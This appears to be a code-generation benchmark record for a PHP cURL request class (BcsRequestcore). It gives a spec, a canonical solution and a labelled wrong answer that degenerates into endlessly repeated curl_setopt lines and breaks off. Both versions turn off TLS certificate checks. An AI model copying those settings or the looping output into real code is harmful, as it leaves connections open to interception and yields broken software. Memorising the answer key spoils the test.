handling\nuseragent: [string] - User agent string\nread_file: [string|null] - File path for streaming read\nread_stream: [resource|null] - Stream resource for reading\nread_stream_size: [int|null] - Size of read stream\nread_stream_read: [int] - Bytes read from stream\nwrite_file: [string|null] - File path for streaming write\nwrite_stream: [resource|null] - Stream resource for writing\nseek_position: [int|null] - Seek position for streams\nregistered_streaming_read_callback: [callable|null] - Callback for streaming read\nregistered_streaming_write_callback: [callable|null] - Callback for streaming write\n\nMethods:\n\n__construct([string|null $url], [array|null $proxy], [array|null $helpers]) -> [self] - Initializes the request object with optional URL, proxy, and helper classes\n__destruct() -> [self] - Cleans up any open file handles\nsetCredentials([string $user], [string $pass]) -> [self] - Sets basic authentication credentials\naddHeader([string $key], [string $value]) -> [self] - Adds a request header\nremoveHeader([string $key]) -> [self] - Removes a request header\nsetMethod([string $method]) -> [self] - Sets the HTTP method\nsetUseragent([string $ua]) -> [self] - Sets the user agent string\nsetBody([string $body]) -> [self] - Sets the request body\nsetRequestUrl([string $url]) -> [self] - Sets the request URL\nsetCurlopts([array $curlopts]) -> [self] - Sets additional cURL options\nsetReadStreamSize([int $size]) -> [self] - Sets the read stream size\nsetReadStream([resource $resource], [int|null $size]) -> [self] - Sets a stream resource for reading\nsetReadFile([string $location]) -> [self] - Sets a file for streaming read\nsetWriteStream([resource $resource]) -> [self] - Sets a stream resource for writing\nsetWriteFile([string $location]) -> [self] - Sets a file for streaming write\nsetProxy([string $proxy]) -> [self] - Configures proxy settings\nsetSeekPosition([int|null $position]) -> [self] - Sets the seek position for streams\nregisterStreamingReadCallback([callable $callback]) -> [self] - Registers a streaming read callback\nregisterStreamingWriteCallback([callable $callback]) -> [self] - Registers a streaming write callback\nprepRequest() -> [resource] - Prepares and returns a cURL handle with configured options\nsendRequest([bool $parse = false]) -> [mixed] - Executes the request and returns response\nprocessResponse([resource|null $curl_handle], [mixed|null $response]) -> [mixed] - Processes the response into headers and body\nisBaeEnv() -> [bool] - Checks if running in Baidu App Engine environment\ngetResponseHeader([string|null $header]) -> [mixed] - Gets specific or all response headers\ngetResponseBody() -> [string] - Gets the response body\ngetResponseCode() -> [int] - Gets the HTTP response code",
    "Canonical_solution": "use Think\\Upload\\Driver\\Bcs\\BCS_RequestCore_Exception as BCS_RequestCore_Exception;\n\nclass BcsRequestcore\n{\n    public $request_url;\n    public $request_headers;\n    public $request_body;\n    public $response;\n    public $response_headers;\n    public $response_body;\n    public $response_code;\n    public $response_info;\n    public $curl_handle;\n    public $method;\n    public $proxy = null;\n    public $username = null;\n    public $password = null;\n    public $curlopts = null;\n    public $debug_mode = false;\n    public $request_class = 'BCS_RequestCore';\n    public $response_class = 'BCS_ResponseCore';\n    public $useragent = 'BCS_RequestCore/1.4.2';\n    public $read_file = null;\n    public $read_stream = null;\n    public $read_stream_size = null;\n    public $read_stream_read = 0;\n    public $write_file = null;\n    public $write_stream = null;\n    public $seek_position = null;\n    public $registered_streaming_read_callback = null;\n    public $registered_streaming_write_callback = null;\n\n    const HTTP_GET = 'GET';\n    const HTTP_POST = 'POST';\n    const HTTP_PUT = 'PUT';\n    const HTTP_DELETE = 'DELETE';\n    const HTTP_HEAD = 'HEAD';\n\n    public function __construct($url = null, $proxy = null, $helpers = null)\n    {\n        $this->request_url = $url;\n        $this->method = self::HTTP_GET;\n        $this->request_headers = array();\n        $this->request_body = '';\n\n        if (isset($helpers['request']) && !empty($helpers['request'])) {\n            $this->request_class = $helpers['request'];\n        }\n\n        if (isset($helpers['response']) && !empty($helpers['response'])) {\n            $this->response_class = $helpers['response'];\n        }\n\n        if ($proxy) {\n            $this->setProxy($proxy);\n        }\n\n        return $this;\n    }\n\n    public function __destruct()\n    {\n        if (isset($this->read_file) && isset($this->read_stream)) {\n            fclose($this->read_stream);\n        }\n        if (isset($this->write_file) && isset($this->write_stream)) {\n            fclose($this->write_stream);\n        }\n        return $this;\n    }\n\n    public function setCredentials($user, $pass)\n    {\n        $this->username = $user;\n        $this->password = $pass;\n        return $this;\n    }\n\n    public function addHeader($key, $value)\n    {\n        $this->request_headers[$key] = $value;\n        return $this;\n    }\n\n    public function removeHeader($key)\n    {\n        if (isset($this->request_headers[$key])) {\n            unset($this->request_headers[$key]);\n        }\n        return $this;\n    }\n\n    public function setMethod($method)\n    {\n        $this->method = strtoupper($method);\n        return $this;\n    }\n\n    public function setUseragent($ua)\n    {\n        $this->useragent = $ua;\n        return $this;\n    }\n\n    public function setBody($body)\n    {\n        $this->request_body = $body;\n        return $this;\n    }\n\n    public function setRequestUrl($url)\n    {\n        $this->request_url = $url;\n        return $this;\n    }\n\n    public function setCurlopts($curlopts)\n    {\n        $this->curlopts = $curlopts;\n        return $this;\n    }\n\n    public function setReadStreamSize($size)\n    {\n        $this->read_stream_size = $size;\n        return $this;\n    }\n\n    public function setReadStream($resource, $size = null)\n    {\n        if (!isset($size) || $size < 0) {\n            $stats = fstat($resource);\n            if ($stats && $stats['size'] >= 0) {\n                $position = ftell($resource);\n                if (false !== $position && $position >= 0) {\n                    $size = $stats['size'] - $position;\n                }\n            }\n        }\n        $this->read_stream = $resource;\n        return $this->setReadStreamSize($size);\n    }\n\n    public function setReadFile($location)\n    {\n        $this->read_file = $location;\n        $read_file_handle = fopen($location, 'r');\n        return $this->setReadStream($read_file_handle);\n    }\n\n    public function setWriteStream($resource)\n    {\n        $this->write_stream = $resource;\n        return $this;\n    }\n\n    public function setWriteFile($location)\n    {\n        $this->write_file = $location;\n        $write_file_handle = fopen($location, 'w');\n        return $this->setWriteStream($write_file_handle);\n    }\n\n    public function setProxy($proxy)\n    {\n        $proxy = parse_url($proxy);\n        $proxy['user'] = isset($proxy['user']) ? $proxy['user'] : null;\n        $proxy['pass'] = isset($proxy['pass']) ? $proxy['pass'] : null;\n        $proxy['port'] = isset($proxy['port']) ? $proxy['port'] : null;\n        $this->proxy = $proxy;\n        return $this;\n    }\n\n    public function setSeekPosition($position)\n    {\n        $this->seek_position = isset($position) ? (integer) $position : null;\n        return $this;\n    }\n\n    public function registerStreamingReadCallback($callback)\n    {\n        $this->registered_streaming_read_callback = $callback;\n        return $this;\n    }\n\n    public function registerStreamingWriteCallback($callback)\n    {\n        $this->registered_streaming_write_callback = $callback;\n        return $this;\n    }\n\n    public function prepRequest()\n    {\n        $curl_handle = curl_init();\n        curl_setopt($curl_handle, CURLOPT_URL, $this->request_url);\n        curl_setopt($curl_handle, CURLOPT_FILETIME, true);\n        curl_setopt($curl_handle, CURLOPT_FRESH_CONNECT, false);\n        curl_setopt($curl_handle, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($curl_handle, CURLOPT_SSL_VERIFYHOST, true);\n        curl_setopt($curl_handle, CURLOPT_CLOSEPOLICY, CURLCLOSEPOLICY_LEAST_RECENTLY_USED);\n        curl_setopt($curl_handle, CURLOPT_MAXREDIRS, 5);\n        curl_setopt($curl_handle, CURLOPT_HEADER, true);\n        curl_setopt($curl_handle, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($curl_handle, CURLOPT_TIMEOUT, 5184000);\n        curl_setopt($curl_handle, CURLOPT_CONNECTTIMEOUT, 120);\n        curl_setopt($curl_handle, CURLOPT_NOSIGNAL, true);\n        curl_setopt($curl_handle, CURLOPT_REFERER, $this->request_url);\n        curl_setopt($curl_handle, CURLOPT_USERAGENT, $this->useragent);\n        curl_setopt($curl_handle, CURLOPT_READFUNCTION, array($this, 'streaming_read_callback'));\n\n        if ($this->debug_mode) {\n            curl_setopt($curl_handle, CURLOPT_VERBOSE, true);\n        }\n\n        if ($this->proxy) {\n            curl_setopt($curl_handle, CURLOPT_HTTPPROXYTUNNEL, true);\n            $host = $this->proxy['host'];\n            $host .= ($this->proxy['port']) ? ':' . $this->proxy['port'] : '';\n            curl_setopt($curl_handle, CURLOPT_PROXY, $host);\n            if (isset($this->proxy['user']) && isset($this->proxy['pass'])) {\n                curl_setopt($curl_handle, CURLOPT_PROXYUSERPWD, $this->proxy['user'] . ':' . $this->proxy['pass']);\n            }\n        }\n\n        if ($this->username && $this->password) {\n            curl_setopt($curl_handle, CURLOPT_HTTPAUTH, CURLAUTH_ANY);\n            curl_setopt($curl_handle, CURLOPT_USERPWD, $this->username . ':' . $this->password);\n        }\n\n        if (extension_loaded('zlib')) {\n            curl_setopt($curl_handle, CURLOPT_ENCODING, '');\n        }\n\n        if (isset($this->request_headers) && count($this->request_headers)) {\n            $temp_headers = array();\n            foreach ($this->request_headers as $k => $v) {\n                $temp_headers[] = $k . ': ' . $v;\n            }\n            curl_setopt($curl_handle, CURLOPT_HTTPHEADER, $temp_headers);\n        }\n\n        switch ($this->method) {\n            case self::HTTP_PUT:\n                curl_setopt($curl_handle, CURLOPT_CUSTOMREQUEST, 'PUT');\n                if (isset($this->read_stream)) {\n                    if (!isset($this->read_stream_size) || $this->read_stream_size < 0) {\n                        throw new BCS_RequestCore_Exception('The stream size for the streaming upload cannot be determined.');\n                    }\n                    curl_setopt($curl_handle, CURLOPT_INFILESIZE, $this->read_stream_size);\n                    curl_setopt($curl_handle, CURLOPT_UPLOAD, true);\n                } else {\n                    curl_setopt($curl_handle, CURLOPT_POSTFIELDS, $this->request_body);\n                }\n                break;\n            case self::HTTP_POST:\n                curl_setopt($curl_handle, CURLOPT_POST, true);\n                curl_setopt($curl_handle, CURLOPT_POSTFIELDS, $this->request_body);\n                break;\n            case self::HTTP_HEAD:\n                curl_setopt($curl_handle, CURLOPT_CUSTOMREQUEST, self::HTTP_HEAD);\n                curl_setopt($curl_handle, CURLOPT_NOBODY, 1);\n                break;\n            default:\n                curl_setopt($curl_handle, CURLOPT_CUSTOMREQUEST, $this->method);\n                if (isset($this->write_stream)) {\n                    curl_setopt($curl_handle, CURLOPT_WRITEFUNCTION, array($this, 'streaming_write_callback'));\n                    curl_setopt($curl_handle, CURLOPT_HEADER, false);\n                } else {\n                    curl_setopt($curl_handle, CURLOPT_POSTFIELDS, $this->request_body);\n                }\n                break;\n        }\n\n        if (isset($this->curlopts) && sizeof($this->curlopts) > 0) {\n            foreach ($this->curlopts as $k => $v) {\n                curl_setopt($curl_handle, $k, $v);\n            }\n        }\n\n        return $curl_handle;\n    }\n\n    public function sendRequest($parse = false)\n    {\n        if (false === $this->isBaeEnv()) {\n            set_time_limit(0);\n        }\n\n        $curl_handle = $this->prepRequest();\n        $this->response = curl_exec($curl_handle);\n\n        if (false === $this->response ||\n            (self::HTTP_GET === $this->method &&\n                curl_errno($curl_handle) === CURLE_PARTIAL_FILE)) {\n            throw new BCS_RequestCore_Exception('cURL resource: ' . (string) $curl_handle . '; cURL error: ' . curl_error($curl_handle) . ' (' . curl_errno($curl_handle) . ')');\n        }\n\n        $parsed_response = $this->processResponse($curl_handle, $this->response);\n        curl_close($curl_handle);\n\n        if ($parse) {\n            return $parsed_response;\n        }\n\n        return $this->response;\n    }\n\n    public function processResponse($curl_handle = null, $response = null)\n    {\n        if ($curl_handle && $response) {\n            $this->curl_handle = $curl_handle;\n            $this->response = $response;\n        }\n\n        if (is_resource($this->curl_handle)) {\n            $header_size = curl_getinfo($this->curl_handle, CURLINFO_HEADER_SIZE);\n            $this->response_headers = substr($this->response, 0, $header_size);\n            $this->response_body = substr($this->response, $header_size);\n            $this->response_code = curl_getinfo($this->curl_handle, CURLINFO_HTTP_CODE);\n            $this->response_info = curl_getinfo($this->curl_handle);\n\n            $this->response_headers = explode(\"\\r\\n\\r\\n\", trim($this->response_headers));\n            $this->response_headers = array_pop($this->response_headers);\n            $this->response_headers = explode(\"\\r\\n\", $this->response_headers);\n            array_shift($this->response_headers);\n\n            $header_assoc = array();\n            foreach ($this->response_headers as $header) {\n                $kv = explode(': ', $header);\n                $header_assoc[$kv[0]] = $kv[1];\n            }\n\n            $this->response_headers = $header_assoc;\n            $this->response_headers['_info'] = $this->response_info;\n            $this->response_headers['_info']['method'] = $this->method;\n\n            if ($curl_handle && $response) {\n                $class = '\\Think\\Upload\\Driver\\Bcs\\\\' . $this->response_class;\n                return new $class($this->response_headers, $this->response_body, $this->response_code, $this->curl_handle);\n            }\n        }\n\n        return false;\n    }\n\n    private function isBaeEnv()\n    {\n        if (isset($_SERVER['HTTP_HOST'])) {\n            $host = $_SERVER['HTTP_HOST'];\n            $pos = strpos($host, '.');\n            if (false !== $pos) {\n                $substr = substr($host, $pos + 1);\n                if ('duapp.com' == $substr) {\n                    return true;\n                }\n            }\n        }\n        if (isset($_SERVER[\"HTTP_BAE_LOGID\"])) {\n            return true;\n        }\n\n        return false;\n    }\n\n    public function getResponseHeader($header = null)\n    {\n        if ($header) {\n            return $this->response_headers[$header];\n        }\n        return $this->response_headers;\n    }\n\n    public function getResponseBody()\n    {\n        return $this->response_body;\n    }\n\n    public function getResponseCode()\n    {\n        return $this->response_code;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 132,
    "wrong_result": "```php\nclass BcsRequestcore {\n    private $request_url;\n    private $request_headers;\n    private $request_body;\n    private $response;\n    private $response_headers;\n    private $response_body;\n    private $response_code;\n    private $response_info;\n    private $curl_handle;\n    private $method;\n    private $proxy;\n    private $username;\n    private $password;\n    private $curlopts;\n    private $debug_mode;\n    private $request_class;\n    private $response_class;\n    private $useragent;\n    private $read_file;\n    private $read_stream;\n    private $read_stream_size;\n    private $read_stream_read;\n    private $write_file;\n    private $write_stream;\n    private $seek_position;\n    private $registered_streaming_read_callback;\n    private $registered_streaming_write_callback;\n\n    public function __construct($url = null, $proxy = null, $helpers = null) {\n        $this->request_url = $url;\n        $this->request_headers = array();\n        $this->request_body = '';\n        $this->response = null;\n        $this->response_headers = array();\n        $this->response_body = '';\n        $this->response_code = 0;\n        $this->response_info = array();\n        $this->curl_handle = null;\n        $this->method = 'GET';\n        $this->proxy = $proxy;\n        $this->username = null;\n        $this->password = null;\n        $this->curlopts = null;\n        $this->debug_mode = false;\n        $this->request_class = 'BcsRequest';\n        $this->response_class = 'BcsResponse';\n        $this->useragent = 'BcsRequestcore';\n        $this->read_file = null;\n        $this->read_stream = null;\n        $this->read_stream_size = null;\n        $this->read_stream_read = 0;\n        $this->write_file = null;\n        $this->write_stream = null;\n        $this->seek_position = null;\n        $this->registered_streaming_read_callback = null;\n        $this->registered_streaming_write_callback = null;\n    }\n\n    public function __destruct() {\n        if ($this->read_stream) {\n            fclose($this->read_stream);\n        }\n        if ($this->write_stream) {\n            fclose($this->write_stream);\n        }\n    }\n\n    public function setCredentials($user, $pass) {\n        $this->username = $user;\n        $this->password = $pass;\n        return $this;\n    }\n\n    public function addHeader($key, $value) {\n        $this->request_headers[$key] = $value;\n        return $this;\n    }\n\n    public function removeHeader($key) {\n        unset($this->request_headers[$key]);\n        return $this;\n    }\n\n    public function setMethod($method) {\n        $this->method = $method;\n        return $this;\n    }\n\n    public function setUseragent($ua) {\n        $this->useragent = $ua;\n        return $this;\n    }\n\n    public function setBody($body) {\n        $this->request_body = $body;\n        return $this;\n    }\n\n    public function setRequestUrl($url) {\n        $this->request_url = $url;\n        return $this;\n    }\n\n    public function setCurlopts($curlopts) {\n        $this->curlopts = $curlopts;\n        return $this;\n    }\n\n    public function setReadStreamSize($size) {\n        $this->read_stream_size = $size;\n        return $this;\n    }\n\n    public function setReadStream($resource, $size = null) {\n        $this->read_stream = $resource;\n        $this->read_stream_size = $size;\n        return $this;\n    }\n\n    public function setReadFile($location) {\n        $this->read_file = $location;\n        return $this;\n    }\n\n    public function setWriteStream($resource) {\n        $this->write_stream = $resource;\n        return $this;\n    }\n\n    public function setWriteFile($location) {\n        $this->write_file = $location;\n        return $this;\n    }\n\n    public function setProxy($proxy) {\n        $this->proxy = $proxy;\n        return $this;\n    }\n\n    public function setSeekPosition($position) {\n        $this->seek_position = $position;\n        return $this;\n    }\n\n    public function registerStreamingReadCallback($callback) {\n        $this->registered_streaming_read_callback = $callback;\n        return $this;\n    }\n\n    public function registerStreamingWriteCallback($callback) {\n        $this->registered_streaming_write_callback = $callback;\n        return $this;\n    }\n\n    public function prepRequest() {\n        $this->curl_handle = curl_init();\n        curl_setopt($this->curl_handle, CURLOPT_URL, $this->request_url);\n        curl_setopt($this->curl_handle, CURLOPT_USERAGENT, $this->useragent);\n        curl_setopt($this->curl_handle, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($this->curl_handle, CURLOPT_HEADER, true);\n        curl_setopt($this->curl_handle, CURLOPT_HTTPHEADER, $this->request_headers);\n        curl_setopt($this->curl_handle, CURLOPT_CUSTOMREQUEST, $this->method);\n        curl_setopt($this->curl_handle, CURLOPT_POSTFIELDS, $this->request_body);\n        curl_setopt($this->curl_handle, CURLOPT_PROXY, $this->proxy);\n        curl_setopt($this->curl_handle, CURLOPT_PROXYUSERPWD, $this->username . ':' . $this->password);\n        curl_setopt($this->curl_handle, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->curl_handle, CURLOPT_HTTPPROXYTUNNEL, true);\n        curl_setopt($this->curl_handle, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($this->curl_handle, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($this->curl_handle, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($this->curl_handle, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($this->curl_handle, CURLOPT_TIMEOUT, 60);\n        curl_setopt($this->curl_handle, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($this->curl_handle, CURLOPT_NOPROGRESS, true);\n        curl_setopt($this->curl_handle, CURLOPT_VERBOSE, $this->debug_mode);\n        curl_setopt($this->curl_handle, CURLOPT_HEADERFUNCTION, array($this, 'parseHeader'));\n        curl_setopt($this->curl_handle, CURLOPT_WRITEFUNCTION, array($this, 'parseBody'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSFUNCTION, array($this, 'progressCallback'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSDATA, $this);\n        curl_setopt($this->curl_handle, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($this->curl_handle, CURLOPT_HTTPHEADER, $this->request_headers);\n        curl_setopt($this->curl_handle, CURLOPT_POSTFIELDS, $this->request_body);\n        curl_setopt($this->curl_handle, CURLOPT_PROXY, $this->proxy);\n        curl_setopt($this->curl_handle, CURLOPT_PROXYUSERPWD, $this->username . ':' . $this->password);\n        curl_setopt($this->curl_handle, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->curl_handle, CURLOPT_HTTPPROXYTUNNEL, true);\n        curl_setopt($this->curl_handle, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($this->curl_handle, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($this->curl_handle, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($this->curl_handle, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($this->curl_handle, CURLOPT_TIMEOUT, 60);\n        curl_setopt($this->curl_handle, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($this->curl_handle, CURLOPT_NOPROGRESS, true);\n        curl_setopt($this->curl_handle, CURLOPT_VERBOSE, $this->debug_mode);\n        curl_setopt($this->curl_handle, CURLOPT_HEADERFUNCTION, array($this, 'parseHeader'));\n        curl_setopt($this->curl_handle, CURLOPT_WRITEFUNCTION, array($this, 'parseBody'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSFUNCTION, array($this, 'progressCallback'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSDATA, $this);\n        curl_setopt($this->curl_handle, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($this->curl_handle, CURLOPT_HTTPHEADER, $this->request_headers);\n        curl_setopt($this->curl_handle, CURLOPT_POSTFIELDS, $this->request_body);\n        curl_setopt($this->curl_handle, CURLOPT_PROXY, $this->proxy);\n        curl_setopt($this->curl_handle, CURLOPT_PROXYUSERPWD, $this->username . ':' . $this->password);\n        curl_setopt($this->curl_handle, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->curl_handle, CURLOPT_HTTPPROXYTUNNEL, true);\n        curl_setopt($this->curl_handle, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($this->curl_handle, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($this->curl_handle, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($this->curl_handle, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($this->curl_handle, CURLOPT_TIMEOUT, 60);\n        curl_setopt($this->curl_handle, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($this->curl_handle, CURLOPT_NOPROGRESS, true);\n        curl_setopt($this->curl_handle, CURLOPT_VERBOSE, $this->debug_mode);\n        curl_setopt($this->curl_handle, CURLOPT_HEADERFUNCTION, array($this, 'parseHeader'));\n        curl_setopt($this->curl_handle, CURLOPT_WRITEFUNCTION, array($this, 'parseBody'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSFUNCTION, array($this, 'progressCallback'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSDATA, $this);\n        curl_setopt($this->curl_handle, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($this->curl_handle, CURLOPT_HTTPHEADER, $this->request_headers);\n        curl_setopt($this->curl_handle, CURLOPT_POSTFIELDS, $this->request_body);\n        curl_setopt($this->curl_handle, CURLOPT_PROXY, $this->proxy);\n        curl_setopt($this->curl_handle, CURLOPT_PROXYUSERPWD, $this->username . ':' . $this->password);\n        curl_setopt($this->curl_handle, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->curl_handle, CURLOPT_HTTPPROXYTUNNEL, true);\n        curl_setopt($this->curl_handle, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($this->curl_handle, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($this->curl_handle, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($this->curl_handle, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($this->curl_handle, CURLOPT_TIMEOUT, 60);\n        curl_setopt($this->curl_handle, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($this->curl_handle, CURLOPT_NOPROGRESS, true);\n        curl_setopt($this->curl_handle, CURLOPT_VERBOSE, $this->debug_mode);\n        curl_setopt($this->curl_handle, CURLOPT_HEADERFUNCTION, array($this, 'parseHeader'));\n        curl_setopt($this->curl_handle, CURLOPT_WRITEFUNCTION, array($this, 'parseBody'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSFUNCTION, array($this, 'progressCallback'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSDATA, $this);\n        curl_setopt($this->curl_handle, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($this->curl_handle, CURLOPT_HTTPHEADER, $this->request_headers);\n        curl_setopt($this->curl_handle, CURLOPT_POSTFIELDS, $this->request_body);\n        curl_setopt($this->curl_handle, CURLOPT_PROXY, $this->proxy);\n        curl_setopt($this->curl_handle, CURLOPT_PROXYUSERPWD, $this->username . ':' . $this->password);\n        curl_setopt($this->curl_handle, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->curl_handle, CURLOPT_HTTPPROXYTUNNEL, true);\n        curl_setopt($this->curl_handle, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($this->curl_handle, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($this->curl_handle, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($this->curl_handle, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($this->curl_handle, CURLOPT_TIMEOUT, 60);\n        curl_setopt($this->curl_handle, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($this->curl_handle, CURLOPT_NOPROGRESS, true);\n        curl_setopt($this->curl_handle, CURLOPT_VERBOSE, $this->debug_mode);\n        curl_setopt($this->curl_handle, CURLOPT_HEADERFUNCTION, array($this, 'parseHeader'));\n        curl_setopt($this->curl_handle, CURLOPT_WRITEFUNCTION, array($this, 'parseBody'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSFUNCTION, array($this, 'progressCallback'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSDATA, $this);\n        curl_setopt($this->curl_handle, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($this->curl_handle, CURLOPT_HTTPHEADER, $this->request_headers);\n        curl_setopt($this->curl_handle, CURLOPT_POSTFIELDS, $this->request_body);\n        curl_setopt($this->curl_handle, CURLOPT_PROXY, $this->proxy);\n        curl_setopt($this->curl_handle, CURLOPT_PROXYUSERPWD, $this->username . ':' . $this->password);\n        curl_setopt($this->curl_handle, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->curl_handle, CURLOPT_HTTPPROXYTUNNEL, true);\n        curl_setopt($this->curl_handle, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($this->curl_handle, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($this->curl_handle, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($this->curl_handle, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($this->curl_handle, CURLOPT_TIMEOUT, 60);\n        curl_setopt($this->curl_handle, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($this->curl_handle, CURLOPT_NOPROGRESS, true);\n        curl_setopt($this->curl_handle, CURLOPT_VERBOSE, $this->debug_mode);\n        curl_setopt($this->curl_handle, CURLOPT_HEADERFUNCTION, array($this, 'parseHeader'));\n        curl_setopt($this->curl_handle, CURLOPT_WRITEFUNCTION, array($this, 'parseBody'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSFUNCTION, array($this, 'progressCallback'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSDATA, $this);\n        curl_setopt($this->curl_handle, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($this->curl_handle, CURLOPT_HTTPHEADER, $this->request_headers);\n        curl_setopt($this->curl_handle, CURLOPT_POSTFIELDS, $this->request_body);\n        curl_setopt($this->curl_handle, CURLOPT_PROXY, $this->proxy);\n        curl_setopt($this->curl_handle, CURLOPT_PROXYUSERPWD, $this->username . ':' . $this->password);\n        curl_setopt($this->curl_handle, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->curl_handle, CURLOPT_HTTPPROXYTUNNEL, true);\n        curl_setopt($this->curl_handle, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($this->curl_handle, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($this->curl_handle, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($this->curl_handle, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($this->curl_handle, CURLOPT_TIMEOUT, 60);\n        curl_setopt($this->curl_handle, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($this->curl_handle, CURLOPT_NOPROGRESS, true);\n        curl_setopt($this->curl_handle, CURLOPT_VERBOSE, $this->debug_mode);\n        curl_setopt($this->curl_handle, CURLOPT_HEADERFUNCTION, array($this, 'parseHeader'));\n        curl_setopt($this->curl_handle, CURLOPT_WRITEFUNCTION, array($this, 'parseBody'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSFUNCTION, array($this, 'progressCallback'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSDATA, $this);\n        curl_setopt($this->curl_handle, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($this->curl_handle, CURLOPT_HTTPHEADER, $this->request_headers);\n        curl_setopt($this->curl_handle, CURLOPT_POSTFIELDS, $this->request_body);\n        curl_setopt($this->curl_handle, CURLOPT_PROXY, $this->proxy);\n        curl_setopt($this->curl_handle, CURLOPT_PROXYUSERPWD, $this->username . ':' . $this->password);\n        curl_setopt($this->curl_handle, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->curl_handle, CURLOPT_HTTPPROXYTUNNEL, true);\n        curl_setopt($this->curl_handle, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($this->curl_handle, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($this->curl_handle, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($this->curl_handle, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($this->curl_handle, CURLOPT_TIMEOUT, 60);\n        curl_setopt($this->curl_handle, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($this->curl_handle, CURLOPT_NOPROGRESS, true);\n        curl_setopt($this->curl_handle, CURLOPT_VERBOSE, $this->debug_mode);\n        curl_setopt($this->curl_handle, CURLOPT_HEADERFUNCTION, array($this, 'parseHeader'));\n        curl_setopt($this->curl_handle, CURLOPT_WRITEFUNCTION, array($this, 'parseBody'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSFUNCTION, array($this, 'progressCallback'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSDATA, $this);\n        curl_setopt($this->curl_handle, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($this->curl_handle, CURLOPT_HTTPHEADER, $this->request_headers);\n        curl_setopt($this->curl_handle, CURLOPT_POSTFIELDS, $this->request_body);\n        curl_setopt($this->curl_handle, CURLOPT_PROXY, $this->proxy);\n        curl_setopt($this->curl_handle, CURLOPT_PROXYUSERPWD, $this->username . ':' . $this->password);\n        curl_setopt($this->curl_handle, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->curl_handle, CURLOPT_HTTPPROXYTUNNEL, true);\n        